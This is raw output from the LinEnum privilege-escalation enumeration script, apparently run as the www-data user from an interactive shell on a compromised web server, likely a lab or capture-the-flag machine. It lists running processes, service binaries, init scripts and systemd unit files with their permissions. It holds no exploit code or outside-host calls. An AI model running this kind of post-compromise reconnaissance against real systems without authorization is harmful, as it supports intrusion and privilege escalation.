www-data  34397  0.0  0.1  18372  3072 ?        S    09:59   0:00 bash
www-data  34399  0.0  0.1  18504  3432 ?        S    09:59   0:00 bash -i
root      34491  0.0  0.0      0     0 ?        I    10:02   0:00 [kworker/2:2-cgr]
www-data  34533  0.0  0.2  19160  3940 ?        S    10:03   0:00 /bin/bash ./LinEnum.sh -r LinEnum
www-data  34535  0.1  0.1  19292  3000 ?        S    10:03   0:00 /bin/bash ./LinEnum.sh -r LinEnum
www-data  34536  0.0  0.0   4532   736 ?        S    10:03   0:00 tee -a LinEnum-03-02-20
root      34724  0.0  0.0      0     0 ?        I    10:03   0:00 [kworker/0:1]
www-data  34731  0.0  0.1  19292  2760 ?        S    10:03   0:00 /bin/bash ./LinEnum.sh -r LinEnum
www-data  34732  0.0  0.1  36696  3220 ?        R    10:03   0:00 ps aux


[00;31m[-] Process binaries and associated permissions (from above list):[00m
-rwxr-xr-x 1 root root  1113504 Apr  4  2018 /bin/bash
-rwxr-xr-x 1 root root   121432 Jan 25  2018 /bin/dash
-rwxr-xr-x 1 root root   129096 Sep  5 03:59 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   219272 Sep  5 03:59 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  1625168 Sep  5 03:59 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   378944 Sep  5 03:59 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    38976 Sep  5 03:59 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   584136 Sep  5 03:59 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    56552 Oct 15  2018 /sbin/agetty
lrwxrwxrwx 1 root root       20 Sep  5 03:59 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root    84104 Apr 12  2018 /sbin/lvmetad
-rwxr-xr-x 1 root root   125144 Oct 10  2018 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root   236584 Jun 10  2019 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Nov 23  2018 /usr/bin/lxcfs
lrwxrwxrwx 1 root root       21 Aug  1  2019 /usr/bin/php -> /etc/alternatives/php
lrwxrwxrwx 1 root root        9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root root    47360 Oct 10  2018 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 18356904 Jul 12  2019 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   671392 Sep 16 12:58 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root root    64184 Jan  9  2019 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root   170136 Jun 18  2019 /usr/sbin/mosquitto
-rwxr-xr-x 1 root root 24605800 Nov 15 13:23 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   786856 Mar  4  2019 /usr/sbin/sshd


[00;31m[-] /etc/init.d/ binary permissions:[00m
total 204
drwxr-xr-x   2 root root 4096 Dec  9 12:43 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rwxr-xr-x   1 root root 2269 Apr 22  2017 acpid
-rwxr-xr-x   1 root root 2489 Jul 16  2019 apache-htcacheclean
-rwxr-xr-x   1 root root 8181 Jul 16  2019 apache2
-rwxr-xr-x   1 root root 4335 Mar 22  2018 apparmor
-rwxr-xr-x   1 root root 2802 Nov 20  2017 apport
-rwxr-xr-x   1 root root 1071 Aug 21  2015 atd
-rwxr-xr-x   1 root root 1232 Apr 19  2018 console-setup.sh
-rwxr-xr-x   1 root root 3049 Nov 16  2017 cron
-rwxr-xr-x   1 root root  937 Mar 18  2018 cryptdisks
-rwxr-xr-x   1 root root  978 Mar 18  2018 cryptdisks-early
-rwxr-xr-x   1 root root 2813 Nov 15  2017 dbus
-rwxr-xr-x   1 root root 4489 Jun 28  2018 ebtables
-rwxr-xr-x   1 root root  985 Mar 18  2019 grub-common
-rwxr-xr-x   1 root root 3809 Feb 14  2018 hwclock.sh
-rwxr-xr-x   1 root root 2444 Oct 25  2017 irqbalance
-rwxr-xr-x   1 root root 1503 Dec 12  2018 iscsid
-rwxr-xr-x   1 root root 1479 Feb 15  2018 keyboard-setup.sh
-rwxr-xr-x   1 root root 2044 Aug 15  2017 kmod
-rwxr-xr-x   1 root root  695 Dec  3  2017 lvm2
-rwxr-xr-x   1 root root  571 Dec  3  2017 lvm2-lvmetad
-rwxr-xr-x   1 root root  586 Dec  3  2017 lvm2-lvmpolld
-rwxr-xr-x   1 root root 2378 Nov 23  2018 lxcfs
-rwxr-xr-x   1 root root 2240 Nov 23  2018 lxd
-rwxr-xr-x   1 root root 2653 Jun 26  2018 mdadm
-rwxr-xr-x   1 root root 1249 Jun 26  2018 mdadm-waitidle
-rwxr-xr-x   1 root root 3323 Feb 28  2018 mosquitto
-rwxr-xr-x   1 root root 5607 Jan 12  2018 mysql
-rwxr-xr-x   1 root root 4597 Nov 25  2016 networking
-rwxr-xr-x   1 root root 2503 Dec 12  2018 open-iscsi
-rwxr-xr-x   1 root root 1846 Sep 10  2018 open-vm-tools
-rwxr-xr-x   1 root root 1366 Jan 17  2018 plymouth
-rwxr-xr-x   1 root root  752 Jan 17  2018 plymouth-log
-rwxr-xr-x   1 root root 1191 Jan 17  2018 procps
-rwxr-xr-x   1 root root 4355 Dec 13  2017 rsync
-rwxr-xr-x   1 root root 2864 Jan 14  2018 rsyslog
-rwxr-xr-x   1 root root 1222 May 21  2017 screen-cleanup
-rwxr-xr-x   1 root root 3837 Jan 25  2018 ssh
-rwxr-xr-x   1 root root 5974 Apr 20  2018 udev
-rwxr-xr-x   1 root root 2083 Aug 15  2017 ufw
-rwxr-xr-x   1 root root 1391 Dec 13  2018 unattended-upgrades
-rwxr-xr-x   1 root root 1306 Oct 15  2018 uuidd
-rwxr-xr-x   1 root root 2757 Jan 20  2017 x11-common


[00;31m[-] /etc/init/ config file permissions:[00m
total 16
drwxr-xr-x   2 root root 4096 Nov 30 17:01 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rw-r--r--   1 root root  125 Sep  7 18:51 mosquitto.conf
-rw-r--r--   1 root root 1757 Jan 12  2018 mysql.conf


[00;31m[-] /lib/systemd/* config file permissions:[00m
/lib/systemd/:
total 7.3M
drwxr-xr-x 23 root root  36K Dec  9 12:43 system
drwxr-xr-x  2 root root 4.0K Sep 12 15:50 network
drwxr-xr-x  2 root root 4.0K Sep 12 15:50 system-generators
drwxr-xr-x  2 root root 4.0K Sep 12 15:50 system-preset
-rw-r--r--  1 root root 2.3M Sep  5 03:59 libsystemd-shared-237.so
-rw-r--r--  1 root root  699 Sep  5 03:59 resolv.conf
-rwxr-xr-x  1 root root 1.3K Sep  5 03:59 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Sep  5 03:59 systemd
-rwxr-xr-x  1 root root 6.0K Sep  5 03:59 systemd-ac-power
-rwxr-xr-x  1 root root  18K Sep  5 03:59 systemd-backlight
-rwxr-xr-x  1 root root  11K Sep  5 03:59 systemd-binfmt
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-cgroups-agent
-rwxr-xr-x  1 root root  22K Sep  5 03:59 systemd-cryptsetup
-rwxr-xr-x  1 root root  15K Sep  5 03:59 systemd-dissect
-rwxr-xr-x  1 root root  18K Sep  5 03:59 systemd-fsck
-rwxr-xr-x  1 root root  23K Sep  5 03:59 systemd-fsckd
-rwxr-xr-x  1 root root  19K Sep  5 03:59 systemd-growfs
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Sep  5 03:59 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Sep  5 03:59 systemd-initctl
-rwxr-xr-x  1 root root 127K Sep  5 03:59 systemd-journald
-rwxr-xr-x  1 root root  35K Sep  5 03:59 systemd-localed
-rwxr-xr-x  1 root root 215K Sep  5 03:59 systemd-logind
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-makefs
-rwxr-xr-x  1 root root  15K Sep  5 03:59 systemd-modules-load
-rwxr-xr-x  1 root root 1.6M Sep  5 03:59 systemd-networkd
-rwxr-xr-x  1 root root  19K Sep  5 03:59 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Sep  5 03:59 systemd-quotacheck
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-random-seed
-rwxr-xr-x  1 root root  15K Sep  5 03:59 systemd-remount-fs
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-reply-password
-rwxr-xr-x  1 root root 371K Sep  5 03:59 systemd-resolved
-rwxr-xr-x  1 root root  19K Sep  5 03:59 systemd-rfkill
-rwxr-xr-x  1 root root  43K Sep  5 03:59 systemd-shutdown
-rwxr-xr-x  1 root root  19K Sep  5 03:59 systemd-sleep
-rwxr-xr-x  1 root root  23K Sep  5 03:59 systemd-socket-proxyd
-rwxr-xr-x  1 root root  11K Sep  5 03:59 systemd-sulogin-shell
-rwxr-xr-x  1 root root  15K Sep  5 03:59 systemd-sysctl
-rwxr-xr-x  1 root root  27K Sep  5 03:59 systemd-timedated
-rwxr-xr-x  1 root root  39K Sep  5 03:59 systemd-timesyncd
-rwxr-xr-x  1 root root 571K Sep  5 03:59 systemd-udevd
-rwxr-xr-x  1 root root  15K Sep  5 03:59 systemd-update-utmp
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-user-sessions
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-veritysetup
-rwxr-xr-x  1 root root  10K Sep  5 03:59 systemd-volatile-root
-rwxr-xr-x  1 root root 1.3K Jul 22  2019 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Feb 14  2019 system-sleep
drwxr-xr-x  2 root root 4.0K Feb 14  2019 system-shutdown

/lib/systemd/system:
total 1.1M
drwxr-xr-x 2 root root 4.0K Nov 10 13:25 apache2.service.d
lrwxrwxrwx 1 root root    9 Oct 10 18:32 sudo.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 getty.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 timers.target.wants
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Sep 12 15:50 user@.service.d
lrwxrwxrwx 1 root root   14 Sep  5 03:59 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 checkroot.service -> /dev/null
-rw-r--r-- 1 root root 1.1K Sep  5 03:59 console-getty.service
-rw-r--r-- 1 root root 1.3K Sep  5 03:59 container-getty@.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Sep  5 03:59 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Sep  5 03:59 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Sep  5 03:59 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Sep  5 03:59 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Sep  5 03:59 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Sep  5 03:59 debug-shell.service
lrwxrwxrwx 1 root root   16 Sep  5 03:59 default.target -> graphical.target
-rw-r--r-- 1 root root  797 Sep  5 03:59 emergency.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 fuse.service -> /dev/null
-rw-r--r-- 1 root root 2.0K Sep  5 03:59 getty@.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  670 Sep  5 03:59 initrd-cleanup.service
-rw-r--r-- 1 root root  830 Sep  5 03:59 initrd-parse-etc.service
-rw-r--r-- 1 root root  589 Sep  5 03:59 initrd-switch-root.service
-rw-r--r-- 1 root root  704 Sep  5 03:59 initrd-udevadm-cleanup-db.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 killprocs.service -> /dev/null
-rw-r--r-- 1 root root  717 Sep  5 03:59 kmod-static-nodes.service
lrwxrwxrwx 1 root root   28 Sep  5 03:59 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Sep  5 03:59 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Sep  5 03:59 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  609 Sep  5 03:59 quotaon.service
-rw-r--r-- 1 root root  716 Sep  5 03:59 rc-local.service
lrwxrwxrwx 1 root root   16 Sep  5 03:59 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 reboot.service -> /dev/null
-rw-r--r-- 1 root root  788 Sep  5 03:59 rescue.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Sep  5 03:59 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Sep  5 03:59 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Sep  5 03:59 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Sep  5 03:59 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Sep  5 03:59 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Sep  5 03:59 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Sep  5 03:59 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Sep  5 03:59 sendsigs.service -> /dev/null
-rw-r--r-- 1 root root 1.5K Sep  5 03:59 serial-getty@.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 stop-bootlogd.service -> /dev/null
-rw-r--r-- 1 root root  554 Sep  5 03:59 suspend-then-hibernate.target
-rw-r--r-- 1 root root 1.4K Sep  5 03:59 system-update-cleanup.service
-rw-r--r-- 1 root root  724 Sep  5 03:59 systemd-ask-password-console.service
-rw-r--r-- 1 root root  752 Sep  5 03:59 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  752 Sep  5 03:59 systemd-backlight@.service
-rw-r--r-- 1 root root  999 Sep  5 03:59 systemd-binfmt.service
-rw-r--r-- 1 root root  537 Sep  5 03:59 systemd-exit.service
-rw-r--r-- 1 root root  714 Sep  5 03:59 systemd-fsck-root.service
-rw-r--r-- 1 root root  715 Sep  5 03:59 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Sep  5 03:59 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Sep  5 03:59 systemd-fsckd.socket
-rw-r--r-- 1 root root  584 Sep  5 03:59 systemd-halt.service
-rw-r--r-- 1 root root  671 Sep  5 03:59 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Sep  5 03:59 systemd-hibernate.service
-rw-r--r-- 1 root root 1.1K Sep  5 03:59 systemd-hostnamed.service
-rw-r--r-- 1 root root  818 Sep  5 03:59 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Sep  5 03:59 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  551 Sep  5 03:59 systemd-initctl.service
-rw-r--r-- 1 root root  771 Sep  5 03:59 systemd-journal-flush.service
-rw-r--r-- 1 root root  686 Sep  5 03:59 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Sep  5 03:59 systemd-journald.service
-rw-r--r-- 1 root root  597 Sep  5 03:59 systemd-kexec.service
-rw-r--r-- 1 root root 1.1K Sep  5 03:59 systemd-localed.service
-rw-r--r-- 1 root root 1.5K Sep  5 03:59 systemd-logind.service
-rw-r--r-- 1 root root  733 Sep  5 03:59 systemd-machine-id-commit.service
-rw-r--r-- 1 root root 1007 Sep  5 03:59 systemd-modules-load.service
-rw-r--r-- 1 root root  740 Sep  5 03:59 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.9K Sep  5 03:59 systemd-networkd.service
-rw-r--r-- 1 root root  593 Sep  5 03:59 systemd-poweroff.service
-rw-r--r-- 1 root root  655 Sep  5 03:59 systemd-quotacheck.service
-rw-r--r-- 1 root root  792 Sep  5 03:59 systemd-random-seed.service
-rw-r--r-- 1 root root  588 Sep  5 03:59 systemd-reboot.service
-rw-r--r-- 1 root root  833 Sep  5 03:59 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Sep  5 03:59 systemd-resolved.service
-rw-r--r-- 1 root root  724 Sep  5 03:59 systemd-rfkill.service
-rw-r--r-- 1 root root  573 Sep  5 03:59 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  537 Sep  5 03:59 systemd-suspend.service
-rw-r--r-- 1 root root  693 Sep  5 03:59 systemd-sysctl.service
-rw-r--r-- 1 root root 1.1K Sep  5 03:59 systemd-timedated.service
-rw-r--r-- 1 root root 1.4K Sep  5 03:59 systemd-timesyncd.service
-rw-r--r-- 1 root root  659 Sep  5 03:59 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  764 Sep  5 03:59 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  744 Sep  5 03:59 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  863 Sep  5 03:59 systemd-udev-settle.service
-rw-r--r-- 1 root root  755 Sep  5 03:59 systemd-udev-trigger.service
-rw-r--r-- 1 root root  985 Sep  5 03:59 systemd-udevd.service
-rw-r--r-- 1 root root  797 Sep  5 03:59 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Sep  5 03:59 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Sep  5 03:59 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Sep  5 03:59 systemd-volatile-root.service
lrwxrwxrwx 1 root root   21 Sep  5 03:59 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Sep  5 03:59 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Sep  5 03:59 urandom.service -> systemd-random-seed.service
-rw-r--r-- 1 root root  593 Sep  5 03:59 user@.service
lrwxrwxrwx 1 root root    9 Sep  5 03:59 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  342 Jul 22  2019 getty-static.service
-rw-r--r-- 1 root root  362 Jul 22  2019 ondemand.service
-rw-r--r-- 1 root root  528 Jul 16  2019 apache-htcacheclean.service
-rw-r--r-- 1 root root  537 Jul 16  2019 apache-htcacheclean@.service
-rw-r--r-- 1 root root  346 Jul 16  2019 apache2.service
-rw-r--r-- 1 root root  418 Jul 16  2019 apache2@.service
-rw-r--r-- 1 root root  340 Jul 12  2019 snapd.autoimport.service
-rw-r--r-- 1 root root  320 Jul 12  2019 snapd.core-fixup.service
-rw-r--r-- 1 root root  172 Jul 12  2019 snapd.failure.service
-rw-r--r-- 1 root root  322 Jul 12  2019 snapd.seeded.service
-rw-r--r-- 1 root root  477 Jul 12  2019 snapd.service
-rw-r--r-- 1 root root  372 Jul 12  2019 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Jul 12  2019 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Jul 12  2019 snapd.socket
-rw-r--r-- 1 root root  521 Jul 12  2019 snapd.system-shutdown.service
-rw-r--r-- 1 root root  505 Jun 10  2019 dbus.service
-rw-r--r-- 1 root root  106 Jun 10  2019 dbus.socket
lrwxrwxrwx 1 root root    9 Feb 14  2019 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Feb 14  2019 halt.target.wants
drwxr-xr-x 2 root root 4.0K Feb 14  2019 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Feb 14  2019 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Feb 14  2019 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Feb 14  2019 reboot.target.wants
-rw-r--r-- 1 root root  242 Feb  6  2019 apport-autoreport.service
-rw-r--r-- 1 root root  238 Jan 25  2019 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Jan 25  2019 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  326 Jan 25  2019 apt-daily.service
-rw-r--r-- 1 root root  156 Jan 25  2019 apt-daily.timer
-rw-r--r-- 1 root root  266 Jan 10  2019 netplan-wpa@.service
-rw-r--r-- 1 root root  368 Jan  9  2019 irqbalance.service
-rw-r--r-- 1 root root  372 Dec 13  2018 unattended-upgrades.service
-rw-r--r-- 1 root root  494 Dec 12  2018 iscsid.service
-rw-r--r-- 1 root root  175 Dec 12  2018 iscsid.socket
-rw-r--r-- 1 root root  987 Dec 12  2018 open-iscsi.service
-rw-r--r-- 1 root root  605 Nov 23  2018 lxd.service
-rw-r--r-- 1 root root  320 Nov 23  2018 lxd-containers.service
-rw-r--r-- 1 root root  197 Nov 23  2018 lxd.socket
-rw-r--r-- 1 root root  311 Nov 23  2018 lxcfs.service
-rw-r--r-- 1 root root   92 Oct 15  2018 fstrim.service
-rw-r--r-- 1 root root  170 Oct 15  2018 fstrim.timer
-rw-r--r-- 1 root root  189 Oct 15  2018 uuidd.service
-rw-r--r-- 1 root root  126 Oct 15  2018 uuidd.socket
-rw-r--r-- 1 root root  618 Oct 15  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct 15  2018 friendly-recovery.target
-rw-r--r-- 1 root root  258 Oct 15  2018 networkd-dispatcher.service
-rw-r--r-- 1 root root  418 Oct  3  2018 cloud-config.service
-rw-r--r-- 1 root root  482 Oct  3  2018 cloud-final.service
-rw-r--r-- 1 root root  580 Oct  3  2018 cloud-init-local.service
-rw-r--r-- 1 root root  642 Oct  3  2018 cloud-init.service
-rw-r--r-- 1 root root  536 Oct  2  2018 cloud-config.target
-rw-r--r-- 1 root root  256 Oct  2  2018 cloud-init.target
-rw-r--r-- 1 root root  412 Sep 11  2018 plymouth-halt.service
-rw-r--r-- 1 root root  426 Sep 11  2018 plymouth-kexec.service
lrwxrwxrwx 1 root root   27 Sep 11  2018 plymouth-log.service -> plymouth-read-write.service
-rw-r--r-- 1 root root  421 Sep 11  2018 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 Sep 11  2018 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 Sep 11  2018 plymouth-quit.service
-rw-r--r-- 1 root root  244 Sep 11  2018 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Sep 11  2018 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Sep 11  2018 plymouth-start.service
-rw-r--r-- 1 root root  291 Sep 11  2018 plymouth-switch-root.service
lrwxrwxrwx 1 root root   21 Sep 11  2018 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  490 Sep 11  2018 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Sep 11  2018 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  306 Sep 11  2018 open-vm-tools.service
-rw-r--r-- 1 root root  298 Sep 10  2018 vgauth.service
-rw-r--r-- 1 root root  173 Aug  6  2018 motd-news.service
-rw-r--r-- 1 root root  175 Aug  6  2018 motd-news.timer
-rw-r--r-- 1 root root  212 Jul 10  2018 apport-autoreport.path
-rw-r--r-- 1 root root  481 Jul  2  2018 mdadm-grow-continue@.service
-rw-r--r-- 1 root root  210 Jul  2  2018 mdadm-last-resort@.service
-rw-r--r-- 1 root root  179 Jul  2  2018 mdadm-last-resort@.timer
-rw-r--r-- 1 root root  670 Jul  2  2018 mdadm-shutdown.service
lrwxrwxrwx 1 root root    9 Jul  2  2018 mdadm-waitidle.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul  2  2018 mdadm.service -> /dev/null
-rw-r--r-- 1 root root 1.1K Jul  2  2018 mdmon@.service
-rw-r--r-- 1 root root  388 Jul  2  2018 mdmonitor.service
-rw-r--r-- 1 root root  456 Jun 28  2018 ebtables.service
-rw-r--r-- 1 root root  309 May 30  2018 pollinate.service
-rw-r--r-- 1 root root  290 Apr 24  2018 rsyslog.service
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel5.target.wants
-rw-r--r-- 1 root root  383 Apr 12  2018 blk-availability.service
-rw-r--r-- 1 root root  341 Apr 12  2018 dm-event.service
-rw-r--r-- 1 root root  248 Apr 12  2018 dm-event.socket
-rw-r--r-- 1 root root  345 Apr 12  2018 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 Apr 12  2018 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  300 Apr 12  2018 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 Apr 12  2018 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  693 Apr 12  2018 lvm2-monitor.service
-rw-r--r-- 1 root root  403 Apr 12  2018 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 Apr 12  2018 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  175 Mar 27  2018 polkit.service
-rw-r--r-- 1 root root  544 Mar 22  2018 apparmor.service
-rw-r--r-- 1 root root  169 Feb 20  2018 atd.service
-rw-r--r-- 1 root root  287 Feb 15  2018 keyboard-setup.service
-rw-r--r-- 1 root root  312 Feb 15  2018 console-setup.service
-rw-r--r-- 1 root root  919 Jan 28  2018 basic.target
-rw-r--r-- 1 root root  419 Jan 28  2018 bluetooth.target
-rw-r--r-- 1 root root  465 Jan 28  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Jan 28  2018 cryptsetup.target
-rw-r--r-- 1 root root  750 Jan 28  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  665 Jan 28  2018 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Jan 28  2018 emergency.target
-rw-r--r-- 1 root root  541 Jan 28  2018 exit.target
-rw-r--r-- 1 root root  480 Jan 28  2018 final.target
-rw-r--r-- 1 root root  506 Jan 28  2018 getty-pre.target
-rw-r--r-- 1 root root  500 Jan 28  2018 getty.target
-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
-rw-r--r-- 1 root root  527 Jan 28  2018 halt.target
-rw-r--r-- 1 root root  509 Jan 28  2018 hibernate.target
-rw-r--r-- 1 root root  530 Jan 28  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  593 Jan 28  2018 initrd-fs.target
-rw-r--r-- 1 root root  561 Jan 28  2018 initrd-root-device.target
-rw-r--r-- 1 root root  566 Jan 28  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  754 Jan 28  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  763 Jan 28  2018 initrd.target
-rw-r--r-- 1 root root  541 Jan 28  2018 kexec.target
-rw-r--r-- 1 root root  435 Jan 28  2018 local-fs-pre.target
-rw-r--r-- 1 root root  547 Jan 28  2018 local-fs.target
-rw-r--r-- 1 root root  445 Jan 28  2018 machine.slice
-rw-r--r-- 1 root root  532 Jan 28  2018 multi-user.target
-rw-r--r-- 1 root root  505 Jan 28  2018 network-online.target
-rw-r--r-- 1 root root  502 Jan 28  2018 network-pre.target
